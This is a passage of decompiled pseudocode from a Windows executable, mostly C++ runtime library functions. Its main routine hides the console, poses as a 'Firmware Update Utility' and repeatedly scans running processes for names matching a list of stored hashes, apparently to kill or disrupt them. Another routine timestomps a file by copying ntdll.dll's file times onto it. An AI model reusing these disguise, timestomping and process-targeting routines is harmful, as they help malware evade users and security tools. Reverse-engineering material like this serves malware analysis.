    return 0xFFFFFFFFLL;
  }
  else
  {
    return 0;
  }
}


// ----- unknown_libname_46 @ 0x14000dd50 -----
// Microsoft VisualC v14 64bit runtime
__int64 __fastcall unknown_libname_46(__int64 a1)
{
  return *(_QWORD *)(a1 + 80);
}


// ----- sub_14000DD60 @ 0x14000dd60 -----
char __fastcall sub_14000DD60(__int64 *a1)
{
  const WCHAR *v2; // rax
  HANDLE hFile; // [rsp+40h] [rbp-38h]
  HANDLE hObject; // [rsp+48h] [rbp-30h]
  struct _FILETIME LastWriteTime; // [rsp+50h] [rbp-28h] BYREF
  struct _FILETIME LastAccessTime; // [rsp+58h] [rbp-20h] BYREF
  struct _FILETIME CreationTime; // [rsp+60h] [rbp-18h] BYREF

  hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", 0x80000000, 1u, nullptr, 3u, 0, nullptr);
  if ( hFile == (HANDLE)-1LL )
    return 0;
  GetFileTime(hFile, &CreationTime, &LastAccessTime, &LastWriteTime);
  CloseHandle(hFile);
  v2 = (const WCHAR *)sub_14000A400(a1);
  hObject = CreateFileW(v2, 0x100u, 3u, nullptr, 3u, 0, nullptr);
  if ( hObject == (HANDLE)-1LL )
    return 0;
  SetFileTime(hObject, &CreationTime, &LastAccessTime, &LastWriteTime);
  CloseHandle(hObject);
  return 1;
}


// ----- ?to_char_type@?$_Narrow_char_traits@DH@std@@SADH@Z @ 0x14000de70 -----
__int64 __fastcall std::_Narrow_char_traits<char,int>::to_char_type(unsigned __int8 a1)
{
  return a1;
}


// ----- ?to_int_type@?$_Narrow_char_traits@DH@std@@SAHD@Z @ 0x14000de80 -----
__int64 __fastcall std::_Narrow_char_traits<char,int>::to_int_type(unsigned __int8 a1)
{
  return a1;
}


// ----- sub_14000DE90 @ 0x14000de90 -----
__int64 *__fastcall sub_14000DE90(__int64 *a1, __int64 a2)
{
  __int64 v3; // [rsp+50h] [rbp-48h]
  __int64 v4; // [rsp+58h] [rbp-40h]
  __int64 v5; // [rsp+60h] [rbp-38h]
  __int64 v6; // [rsp+70h] [rbp-28h] BYREF
  __int64 v7; // [rsp+78h] [rbp-20h] BYREF
  __int64 v8; // [rsp+80h] [rbp-18h] BYREF
  __int64 v9; // [rsp+88h] [rbp-10h] BYREF

  sub_140005000((__int64)a1, a2);
  v3 = *sub_14000A340(a1, &v6);
  v4 = *std::wstring::end(a1, &v7);
  v5 = *sub_14000A340(a1, &v8);
  sub_140004170(&v9, v5, v4, v3, sub_140015B10);
  return a1;
}


// ----- sub_14000DF80 @ 0x14000df80 -----
__int64 __fastcall sub_14000DF80(__int64 a1)
{
  unsigned __int8 *v1; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  unsigned int v5; // [rsp+40h] [rbp-A8h]
  int v7; // [rsp+48h] [rbp-A0h]
  __int64 i; // [rsp+50h] [rbp-98h]
  unsigned int v9; // [rsp+58h] [rbp-90h]
  unsigned int v10; // [rsp+5Ch] [rbp-8Ch]
  unsigned int v11; // [rsp+60h] [rbp-88h]
  unsigned int v12; // [rsp+64h] [rbp-84h]
  __int64 v13; // [rsp+68h] [rbp-80h]
  __int64 v14; // [rsp+70h] [rbp-78h]
  __int64 v15; // [rsp+78h] [rbp-70h]
  __int64 v16; // [rsp+80h] [rbp-68h]
  __int64 v17; // [rsp+88h] [rbp-60h]
  __int64 v18; // [rsp+90h] [rbp-58h]
  __int64 v19; // [rsp+98h] [rbp-50h] BYREF
  unsigned __int8 *v20; // [rsp+A0h] [rbp-48h] BYREF
  unsigned __int8 v21; // [rsp+A8h] [rbp-40h] BYREF
  unsigned __int8 v22; // [rsp+A9h] [rbp-3Fh] BYREF
  _BYTE v23[6]; // [rsp+AAh] [rbp-3Eh] BYREF
  __int64 v24[4]; // [rsp+B0h] [rbp-38h] BYREF

  if ( unknown_libname_35(a1) != 0 && (v13 = unknown_libname_35(a1)) < (unsigned __int64)std::streambuf::egptr(a1) )
  {
    v1 = (unsigned __int8 *)std::streambuf::_Gninc(a1);
    return std::_Narrow_char_traits<char,int>::to_int_type(*v1);
  }
  else if ( *(_QWORD *)(a1 + 128) != 0 )
  {
    sub_140009660(a1);
    if ( *(_QWORD *)(a1 + 104) != 0 )
    {
      sub_140004F30((__int64)v24);
      while ( 1 )
      {
        v7 = fgetc(*(FILE **)(a1 + 128));
        if ( v7 == -1 )
        {
          v9 = sub_14000B200();
          sub_140006820((__int64)v24);
          return v9;
        }
        sub_14000CE90(v24, v7);
        v17 = *(_QWORD *)(a1 + 104);
        v14 = sub_14000A3E0(v24);
        v15 = unknown_libname_77((__int64)v24) + v14;
        v16 = sub_14000A3E0(v24);
        v5 = sub_14000B8A0(v17, a1 + 116, v16, v15, (__int64)&v19, (__int64)&v22, (__int64)v23, (__int64)&v20);
        if ( v5 >= 2 )
        {
          if ( v5 == 3 )
          {
            v11 = *(char *)std::string::front(v24);
            sub_140006820((__int64)v24);
            return v11;
          }
          else
          {
            v12 = sub_14000B200();
            sub_140006820((__int64)v24);
            return v12;
          }
        }
        if ( v20 != &v22 )
          break;
        v4 = sub_14000A3E0(v24);
        std::string::erase((__int64)v24, 0, v19 - v4);
      }
      v18 = sub_14000A3E0(v24);
      v3 = unknown_libname_77((__int64)v24);
      for ( i = v3 + v18 - v19; i > 0; ungetc(*(char *)(i + v19), *(FILE **)(a1 + 128)) )
        --i;
      v10 = std::_Narrow_char_traits<char,int>::to_int_type(v22);
      sub_140006820((__int64)v24);
      return v10;
    }
    else if ( std::_Fgetc<char>(&v21, *(FILE **)(a1 + 128)) != 0 )
    {
      return (unsigned int)std::_Narrow_char_traits<char,int>::to_int_type(v21);
    }
    else
    {
      return (unsigned int)sub_14000B200();
    }
  }
  else
  {
    return sub_14000B200();
  }
}


// ----- sub_14000E310 @ 0x14000e310 -----
__int64 __fastcall sub_14000E310(__int64 a1)
{
  unsigned __int8 *v1; // rax
  int v4; // [rsp+24h] [rbp-14h]
  int v5; // [rsp+28h] [rbp-10h]

  v4 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 48LL))(a1);
  v5 = sub_14000B200();
  if ( std::_Narrow_char_traits<char,int>::eq_int_type(v5, v4) )
  {
    return (unsigned int)sub_14000B200();
  }
  else
  {
    v1 = (unsigned __int8 *)std::streambuf::_Gninc(a1);
    return (unsigned int)std::_Narrow_char_traits<char,int>::to_int_type(*v1);
  }
}


// ----- sub_14000E380 @ 0x14000e380 -----
__int64 __fastcall sub_14000E380(__int64 a1)
{
  unsigned __int8 *v1; // rax
  unsigned int v3; // [rsp+20h] [rbp-28h]
  int v4; // [rsp+28h] [rbp-20h]
  __int64 v5; // [rsp+30h] [rbp-18h]

  if ( unknown_libname_35(a1) != 0 && (v5 = unknown_libname_35(a1)) < (unsigned __int64)std::streambuf::egptr(a1) )
  {
    v1 = (unsigned __int8 *)unknown_libname_35(a1);
    return std::_Narrow_char_traits<char,int>::to_int_type(*v1);
  }
  else
  {
    v3 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 56LL))(a1);
    v4 = sub_14000B200();
    if ( !std::_Narrow_char_traits<char,int>::eq_int_type(v4, v3) )
      (*(void (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + 32LL))(a1, v3);
    return v3;
  }
}


// ----- sub_14000E440 @ 0x14000e440 -----
__int64 sub_14000E440()
{
  return sub_14000B200();
}


// ----- ?shrink_to_fit@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXXZ_2 @ 0x14000e460 -----
__int64 __fastcall std::string::shrink_to_fit(__int64 a1)
{
  unsigned __int8 *v2; // rax
  unsigned __int8 *v3; // [rsp+20h] [rbp-38h]
  unsigned __int64 v4; // [rsp+28h] [rbp-30h]
  __int64 v5; // [rsp+30h] [rbp-28h]
  __int64 v6; // [rsp+38h] [rbp-20h]
  __int64 v7; // [rsp+40h] [rbp-18h] BYREF

  v3 = (unsigned __int8 *)unknown_libname_35(a1);
  if ( v3 == nullptr )
    return sub_14000B200();
  if ( (unsigned __int64)v3 < std::streambuf::egptr(a1) )
    return std::_Narrow_char_traits<char,int>::to_int_type(*v3);
  v7 = unknown_libname_40(a1);
  if ( v7 == 0 || (*(_DWORD *)(a1 + 112) & 4) != 0 )
    return sub_14000B200();
  v4 = *unknown_libname_10((_QWORD *)(a1 + 104), &v7);
  if ( v4 <= (unsigned __int64)v3 )
    return sub_14000B200();
  *(_QWORD *)(a1 + 104) = v4;
  v5 = unknown_libname_35(a1);
  v6 = unknown_libname_32(a1);
  std::streambuf::setg(a1, v6, v5, v4);
  v2 = (unsigned __int8 *)unknown_libname_35(a1);
  return std::_Narrow_char_traits<char,int>::to_int_type(*v2);
}


// ----- sub_14000E590 @ 0x14000e590 -----
__int64 __fastcall sub_14000E590(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64, __int64, __int64))(*(_QWORD *)a1 + 64LL))(
           a1,
           a2,
           a3,
           a4,
           a5);
}


// ----- ?_Error@_Transcode_result@?A0x5e1b7880@@QEBA?AW4__std_win_error@@XZ @ 0x14000e5e0 -----
__int64 __fastcall `anonymous namespace'::_Transcode_result::_Error(unsigned int *a1)
{
  return *a1;
}


// ----- ?get_unexpected_or_default@@YAP6AXXZQEBU__vcrt_ptd@@@Z @ 0x14000e5f0 -----
void (*__fastcall get_unexpected_or_default(const struct __vcrt_ptd *const a1))()
{
  if ( *((_QWORD *)a1 + 1) != 0 )
    return *((void (**)())a1 + 1);
  else
    return (void (*)())"Unknown exception";
}


// ----- ?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z @ 0x14000e630 -----
__int64 __fastcall std::ios::widen(__int64 a1, unsigned __int8 a2)
{
  unsigned __int8 v3; // [rsp+20h] [rbp-38h]
  std::locale *v4; // [rsp+30h] [rbp-28h]
  const struct std::locale::facet *v5; // [rsp+38h] [rbp-20h]
  _BYTE v6[24]; // [rsp+40h] [rbp-18h] BYREF

  v4 = (std::locale *)std::ios_base::getloc(a1, (__int64)v6);
  v5 = sub_1400043A0(v4);
  v3 = sub_14000E6A0(v5, a2);
  sub_140006DC0((__int64)v6);
  return v3;
}


// ----- sub_14000E6A0 @ 0x14000e6a0 -----
__int64 __fastcall sub_14000E6A0(__int64 a1, unsigned __int8 a2)
{
  return (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + 64LL))(a1, a2);
}


// ----- ?width@ios_base@std@@QEAA_J_J@Z @ 0x14000e6e0 -----
__int64 __fastcall std::ios_base::width(std::ios_base *this, __int64 a2)
{
  __int64 v3; // [rsp+0h] [rbp-18h]

  v3 = *((_QWORD *)this + 5);
  *((_QWORD *)this + 5) = a2;
  return v3;
}


// ----- ?width@ios_base@std@@QEBA_JXZ @ 0x14000e720 -----
__int64 __fastcall std::ios_base::width(std::ios_base *this)
{
  return *((_QWORD *)this + 5);
}


// ----- sub_14000E730 @ 0x14000e730 -----
__int64 __fastcall sub_14000E730(__int64 a1, __int64 a2, __int64 a3)
{
  int v4; // [rsp+20h] [rbp-58h]
  __int64 v5; // [rsp+28h] [rbp-50h]
  _QWORD v6[2]; // [rsp+50h] [rbp-28h] BYREF

  v4 = 0;
  sub_140006320((__int64)v6, a1);
  if ( (unsigned __int8)std::optional<unsigned __int64>::operator bool((__int64)v6) != 0 )
  {
    if ( a3 > 0 )
    {
      v5 = unknown_libname_41(*(int *)(*(_QWORD *)a1 + 4LL) + a1);
      if ( sub_14000DBF0(v5, a2, a3) != a3 )
        v4 = 4;
    }
  }
  else
  {
    v4 = 4;
  }
  sub_14000DA70((__crt_win32_buffer_debug_info *)(*(int *)(*(_QWORD *)a1 + 4LL) + a1), v4, 0);
  sub_140006E50(v6);
  return a1;
}


// ----- sub_14000E860 @ 0x14000e860 -----
__int64 __fastcall sub_14000E860(__int64 a1, _BYTE *a2, signed __int64 a3)
{
  _BYTE *v4; // rax
  unsigned __int64 v5; // [rsp+20h] [rbp-58h]
  size_t v6; // [rsp+28h] [rbp-50h]
  size_t v7; // [rsp+38h] [rbp-40h]
  size_t ElementCount; // [rsp+50h] [rbp-28h] BYREF
  __int64 v9; // [rsp+58h] [rbp-20h] BYREF
  _BYTE *Buffer; // [rsp+88h] [rbp+10h]

  Buffer = a2;
  if ( a3 <= 0 )
    return 0;
  if ( *(_QWORD *)(a1 + 104) != 0 )
    return sub_14000EAA0(a1, a2, a3);
  ElementCount = a3;
  v9 = unknown_libname_18(a1);
  if ( v9 != 0 )
  {
    v5 = *unknown_libname_12(&ElementCount, &v9);
    v4 = (_BYTE *)unknown_libname_35(a1);
    sub_14000A830(Buffer, v4, v5);
    Buffer += v5;
    ElementCount -= v5;
    std::streambuf::gbump(a1, v5);
  }
  if ( *(_QWORD *)(a1 + 128) != 0 )
  {
    sub_140009660(a1);
    while ( ElementCount > 0xFFF )
    {
      v6 = fread(Buffer, 1u, 0xFFFu, *(FILE **)(a1 + 128));
      Buffer += v6;
      ElementCount -= v6;
      if ( v6 != 4095 )
        return a3 - ElementCount;
    }
    if ( ElementCount != 0 )
    {
      v7 = fread(Buffer, 1u, ElementCount, *(FILE **)(a1 + 128));
      ElementCount -= v7;
    }
  }
  return a3 - ElementCount;
}


// ----- sub_14000EAA0 @ 0x14000eaa0 -----
__int64 __fastcall sub_14000EAA0(__int64 a1, _BYTE *a2, __int64 a3)
{
  _BYTE *v3; // rax
  int v4; // eax
  int v6; // [rsp+20h] [rbp-28h]
  __int64 v7; // [rsp+28h] [rbp-20h]
  __int64 v11; // [rsp+60h] [rbp+18h]

  v11 = a3;
  while ( v11 > 0 )
  {
    v7 = unknown_libname_18(a1);
    if ( v7 <= 0 )
    {
      v6 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 56LL))(a1);
      v4 = sub_14000B200();
      if ( std::_Narrow_char_traits<char,int>::eq_int_type(v4, v6) )
        return a3 - v11;
      *a2++ = std::_Narrow_char_traits<char,int>::to_char_type(v6);
      --v11;
    }
    else
    {
      if ( v11 < v7 )
        v7 = v11;
      v3 = (_BYTE *)unknown_libname_35(a1);
      sub_14000A830(a2, v3, v7);
      a2 += v7;
      v11 -= v7;
      std::streambuf::gbump(a1, v7);
    }
  }
  return a3 - v11;
}


// ----- ?xsputn@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MEAA_JPEBD_J@Z @ 0x14000ebc0 -----
__int64 __fastcall std::filebuf::xsputn(__int64 a1, _BYTE *a2, __int64 a3)
{
  _BYTE *v4; // rax
  __int64 v5; // [rsp+20h] [rbp-18h]
  _BYTE *Buffer; // [rsp+48h] [rbp+10h]
  __int64 ElementCount; // [rsp+50h] [rbp+18h]

  ElementCount = a3;
  Buffer = a2;
  if ( *(_QWORD *)(a1 + 104) != 0 )
    return sub_14000ECF0(a1, a2, a3);
  v5 = unknown_libname_23(a1);
  if ( ElementCount > 0 && v5 > 0 )
  {
    if ( ElementCount < v5 )
      v5 = ElementCount;
    v4 = (_BYTE *)unknown_libname_40(a1);
    sub_14000A830(v4, Buffer, v5);
    Buffer += v5;
    ElementCount -= v5;
    std::streambuf::pbump(a1, v5);
  }
  if ( ElementCount > 0 && *(_QWORD *)(a1 + 128) != 0 )
    ElementCount -= fwrite(Buffer, 1u, ElementCount, *(FILE **)(a1 + 128));
  return a3 - ElementCount;
}


// ----- sub_14000ECF0 @ 0x14000ecf0 -----
__int64 __fastcall sub_14000ECF0(__int64 a1, unsigned __int8 *a2, __int64 a3)
{
  _BYTE *v3; // rax
  unsigned int v5; // [rsp+20h] [rbp-38h]
  int v6; // [rsp+24h] [rbp-34h]
  int v7; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+30h] [rbp-28h]
  __int64 (__fastcall *v9)(__int64, _QWORD); // [rsp+38h] [rbp-20h]
  __int64 v13; // [rsp+70h] [rbp+18h]

  v13 = a3;
  while ( v13 > 0 )
  {
    v8 = unknown_libname_23(a1);
    if ( v8 <= 0 )
    {
      v9 = *(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + 24LL);
      v5 = std::_Narrow_char_traits<char,int>::to_int_type(*a2);
      v6 = v9(a1, v5);
      v7 = sub_14000B200();
      if ( std::_Narrow_char_traits<char,int>::eq_int_type(v7, v6) )
        return a3 - v13;
      ++a2;
      --v13;
    }
    else
    {
      if ( v13 < v8 )
        v8 = v13;
      v3 = (_BYTE *)unknown_libname_40(a1);
      sub_14000A830(v3, a2, v8);
      a2 += v8;
      v13 -= v8;
      std::streambuf::pbump(a1, v8);
    }
  }
  return a3 - v13;
}


// ----- main @ 0x14000ee30 -----
int __fastcall main(int argc, const char **argv, const char **envp)
{
  HWND ConsoleWindow; // rax
  _WORD *v5; // rax
  bool v6; // [rsp+20h] [rbp-308h]
  _DWORD *v7; // [rsp+28h] [rbp-300h]
  HANDLE hSnapshot; // [rsp+30h] [rbp-2F8h]
  int v9; // [rsp+40h] [rbp-2E8h]
  __int64 v10; // [rsp+50h] [rbp-2D8h]
  _BYTE v11[32]; // [rsp+58h] [rbp-2D0h] BYREF
  __int64 v12[7]; // [rsp+78h] [rbp-2B0h] BYREF
  __int64 v13[4]; // [rsp+B0h] [rbp-278h] BYREF
  PROCESSENTRY32W pe; // [rsp+D0h] [rbp-258h] BYREF

  ConsoleWindow = GetConsoleWindow();
  ShowWindow(ConsoleWindow, 0);
  SetConsoleTitleW(L"Firmware Update Utility");
  SetConsoleCtrlHandler((PHANDLER_ROUTINE)HandlerRoutine, true);
  sub_14000A160(v12, 0x38u);
  sub_140005F20(v12);
  v6 = false;
  if ( sub_14000BA10() != 0 )
  {
    v6 = true;
  }
  else if ( sub_14000AAF0(v12) != 0 )
  {
    v6 = sub_14000BC20((__int64)v12) != 0;
  }
  if ( v6 )
  {
    while ( byte_14009E000 != 0 )
    {
      hSnapshot = CreateToolhelp32Snapshot(2u, 0);
      if ( hSnapshot != (HANDLE)-1LL )
      {
        pe.dwSize = 568;
        if ( Process32FirstW(hSnapshot, &pe) )
        {
          do
          {
            sub_140005150((__int64)v11, (__int64)pe.szExeFile);
            sub_14000DE90(v13, (__int64)v11);
            sub_140006850((__int64)v11);
            v5 = (_WORD *)sub_14000A400(v13);
            v9 = sub_14000A420(v5, 0x811C9DC5);
            v7 = (_DWORD *)sub_140003980(qword_14009FC18);
            v10 = sub_14000A0B0((__int64)qword_14009FC18);
            while ( v7 != (_DWORD *)v10 )
            {
              if ( v9 == *v7 )
                sub_14000BAC0((__int64)v12, pe.th32ProcessID);
              ++v7;
            }
            sub_140006850((__int64)v13);
          }
          while ( Process32NextW(hSnapshot, &pe) );
        }
        CloseHandle(hSnapshot);
      }
      Sleep(0x3E8u);
    }
    std::string::shrink_to_fit(v12);
    sub_140006D60((__int64)v12);
    return 0;
  }
  else
  {
    sub_140006D60((__int64)v12);
    return 1;
  }
}


// ----- sub_14000F090 @ 0x14000f090 -----
__int64 __fastcall sub_14000F090(__int64 a1, unsigned __int16 a2, unsigned __int64 a3)
{
  unsigned int v13; // eax
  __m128i v15; // xmm0
  unsigned int v16; // eax
  unsigned int v17; // eax
  char v18; // [rsp+20h] [rbp+0h] BYREF

  _RBP = (__m128i *)((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL);
  _RBP->m128i_i64[1] = 0;
  _RBP[22].m128i_i32[0] = 0;
  _RBP[1].m128i_i64[1] = a1;
  if ( dword_14009FC10 != 0 && a3 >= 0x10 )
  {
    *(__m128i *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x60) = _mm_cvtsi32_si128(a2);
    __asm
    {
      vpbroadcastw ymm0, word ptr [rbp+170h+var_110]
      vmovdqu [rbp+170h+var_90], ymm0
      vmovdqu ymm0, [rbp+170h+var_90]
      vmovdqu [rbp+170h+var_50], ymm0
    }
    while ( 1 )
    {
      _RAX = *(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x18);
      __asm
      {
        vmovdqu ymm0, ymmword ptr [rax]
        vmovdqu [rbp+170h+var_70], ymm0
        vmovdqu ymm0, [rbp+170h+var_70]
        vmovdqu [rbp+170h+var_B0], ymm0
        vmovdqu ymm0, [rbp+170h+var_B0]
        vpcmpeqw ymm0, ymm0, [rbp+170h+var_50]
        vmovdqu [rbp+170h+var_30], ymm0
        vmovdqu ymm0, [rbp+170h+var_30]
        vmovdqu [rbp+170h+var_B0], ymm0
        vmovdqu ymm0, [rbp+170h+var_B0]
        vpmovmskb eax, ymm0
      }
      *(_DWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x20) = _RAX;
      if ( *(_DWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x20) != 0 )
        break;
      *(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 8) += 16LL;
      *(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x18) += 32LL;
      if ( *(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 8) + 16LL > a3 )
        goto LABEL_7;
    }
    _BitScanForward(&v13, *(_DWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x20));
    *(_DWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x160) = v13;
    *(_DWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x160) >>= 1;
    return a1
         + 2
         * (*(unsigned int *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x160)
          + *(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 8));
  }
  else
  {
LABEL_7:
    if ( *(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 8) + 4LL > a3 )
      goto LABEL_17;
    v15 = _mm_cvtsi32_si128((__int16)a2);
    *(__m128i *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x70) = _mm_shuffle_epi32(
                                                                              _mm_unpacklo_epi16(v15, v15),
                                                                              0);
    *(__m128i *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x50) = _mm_load_si128(_RBP + 7);
    while ( *(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 8) + 8LL <= a3 )
    {
      *(__m128i *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x80) = _mm_loadu_si128((const __m128i *)*(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x18));
      *(__m128i *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x30) = _mm_load_si128(_RBP + 8);
      *(__m128i *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x90) = _mm_cmpeq_epi16(
                                                                                _mm_load_si128(_RBP + 3),
                                                                                *(__m128i *)(((unsigned __int64)&v18
                                                                                            & 0xFFFFFFFFFFFFFFE0uLL)
                                                                                           + 0x50));
      *(__m128i *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x30) = _mm_load_si128(_RBP + 9);
      *(_WORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x10) = _mm_movemask_epi8(_mm_load_si128(_RBP + 3));
      if ( *(_WORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x10) != 0 )
      {
        _BitScanForward(&v16, *(unsigned __int16 *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x10));
        *(_DWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x160) = v16;
        *(_DWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x160) >>= 1;
        return a1
             + 2
             * (*(unsigned int *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x160)
              + *(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 8));
      }
      *(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 8) += 8LL;
      *(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x18) += 16LL;
    }
    if ( *(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 8) + 4LL > a3 )
      goto LABEL_17;
    *(__m128i *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0xA0) = _mm_loadl_epi64((const __m128i *)*(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x18));
    *(__m128i *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x40) = _mm_load_si128(_RBP + 10);
    *(__m128i *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0xB0) = _mm_cmpeq_epi16(
                                                                              _mm_load_si128(_RBP + 4),
                                                                              *(__m128i *)(((unsigned __int64)&v18
                                                                                          & 0xFFFFFFFFFFFFFFE0uLL)
                                                                                         + 0x50));
    *(__m128i *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x40) = _mm_load_si128(_RBP + 11);
    _RBP->m128i_i8[0] = _mm_movemask_epi8(_mm_load_si128(_RBP + 4));
    if ( _RBP->m128i_i8[0] != 0 )
    {
      _BitScanForward(&v17, _RBP->m128i_u8[0]);
      *(_DWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x160) = v17;
      *(_DWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x160) >>= 1;
      return a1
           + 2
           * (*(unsigned int *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 0x160)
            + *(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 8));
    }
    else
    {
      *(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 8) += 4LL;
LABEL_17:
      while ( *(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 8) < a3 )
      {
        if ( *(unsigned __int16 *)(a1 + 2LL * *(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 8)) == a2 )
          return a1 + 2LL * *(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 8);
        ++*(_QWORD *)(((unsigned __int64)&v18 & 0xFFFFFFFFFFFFFFE0uLL) + 8);
      }
      return 0;
    }
  }
}


// ----- CreateToolhelp32Snapshot @ 0x14000f3fa -----
// attributes: thunk
HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID)
{
  return __imp_CreateToolhelp32Snapshot(dwFlags, th32ProcessID);
}


// ----- Process32FirstW @ 0x14000f400 -----
// attributes: thunk
BOOL __stdcall Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe)
{
  return __imp_Process32FirstW(hSnapshot, lppe);
}


// ----- Process32NextW @ 0x14000f406 -----
// attributes: thunk
BOOL __stdcall Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe)
{
  return __imp_Process32NextW(hSnapshot, lppe);
}


// ----- ??0_Init_locks@std@@QEAA@XZ @ 0x14000f40c -----
std::_Init_locks *__fastcall std::_Init_locks::_Init_locks(std::_Init_locks *this)
{
  int *v2; // rbx

  if ( _InterlockedIncrement(&dword_14009E828) == 0 )
  {
    v2 = (int *)&CriticalSection;
    do
    {
      Mtxinit(v2);
      v2 += 10;
    }
    while ( v2 != &dword_14009FDA0 );
  }
  return this;
}


// ----- ??0_Lockit@std@@QEAA@H@Z @ 0x14000f450 -----
std::_Lockit *__fastcall std::_Lockit::_Lockit(std::_Lockit *this, int a2)
{
  *(_DWORD *)this = a2;
  if ( a2 != 0 )
  {
    if ( a2 < 8 )
      EnterCriticalSection(&CriticalSection + a2);
  }
  else
  {
    lock_locales();
  }
  return this;
}


// ----- unknown_libname_47 @ 0x14000f48c -----
// Microsoft VisualC v14 64bit runtime
int *unknown_libname_47()
{
  int *result; // rax
  struct _RTL_CRITICAL_SECTION *v1; // rbx

  result = (int *)(unsigned int)_InterlockedExchangeAdd(&dword_14009E828, 0xFFFFFFFF);
  if ( (int)result - 1 < 0 )
  {
    v1 = &CriticalSection;
    do
    {
      DeleteCriticalSection(v1);
      result = &dword_14009FDA0;
      ++v1;
    }
    while ( v1 != (struct _RTL_CRITICAL_SECTION *)&dword_14009FDA0 );
  }
  return result;
}


// ----- ??1_Lockit@std@@QEAA@XZ @ 0x14000f4c8 -----
void __fastcall std::_Lockit::~_Lockit(std::_Lockit *this)
{
  __int64 v1; // rax

  v1 = *(int *)this;
  if ( (_DWORD)v1 != 0 )
  {
    if ( (int)v1 < 8 )
      LeaveCriticalSection(&CriticalSection + v1);
  }
  else
  {
    Init_thread_unlock();
  }
}


// ----- j___uncaught_exceptions @ 0x14000f4fc -----
// attributes: thunk
__int64 j___uncaught_exceptions(void)
{
  return _uncaught_exceptions();
}


// ----- sub_14000F510 @ 0x14000f510 -----
const __m128i *__fastcall sub_14000F510(const __m128i *a1, const __m128i *a2, __int16 a3)
{
  signed __int64 v4; // r9
  const __m128i *v6; // r10
  unsigned int v13; // r9d
  unsigned __int64 v21; // r9
